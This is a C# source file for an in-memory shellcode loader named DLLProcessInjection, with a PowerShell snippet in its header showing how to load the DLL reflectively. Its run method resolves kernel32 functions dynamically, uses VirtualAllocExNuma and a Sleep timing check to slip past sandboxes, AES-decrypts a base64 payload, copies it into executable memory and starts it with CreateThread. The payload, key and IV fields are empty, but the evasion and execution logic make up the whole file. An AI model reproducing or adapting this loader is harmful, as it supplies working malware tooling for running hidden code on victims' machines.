/*
$dll = "C:\...\DLLProcessInjection.dll"
$bytes = [System.IO.File]::ReadAllBytes($dll)
[System.Reflection.Assembly]::Load($bytes)
[DLLProcessInjection.Main]::run()
*/

using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace DLLProcessInjection
{
    public class Main
    {
        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }
        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        public static void run()
        {
            var pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAllocExNuma");
            var dVirtualAllocExNuma = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAllocExNuma)) as DynamicInvoke.VirtualAllocExNuma;

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "GetCurrentProcess");
            var dGetCurrentProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.GetCurrentProcess)) as DynamicInvoke.GetCurrentProcess;

            IntPtr mem = dVirtualAllocExNuma(dGetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "Sleep");
            var dSleep = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.Sleep)) as DynamicInvoke.Sleep;
            dSleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            string finalPayload = "";
            byte[] key = new byte[] {  };
            byte[] iv = new byte[] {  };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);


            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
            var dVirtualAlloc = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.VirtualAlloc)) as DynamicInvoke.VirtualAlloc;

            IntPtr addr = dVirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(decrypted_data, 0, addr, decrypted_data.Length);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "CreateThread");
            var dCreateThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.CreateThread)) as DynamicInvoke.CreateThread;
            IntPtr hThread = dCreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            pointer = DynamicInvoke.GetLibraryAddress("kernel32.dll", "WaitForSingleObject");
            var dWaitForSingleObject = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DynamicInvoke.WaitForSingleObject)) as DynamicInvoke.WaitForSingleObject;
            dWaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
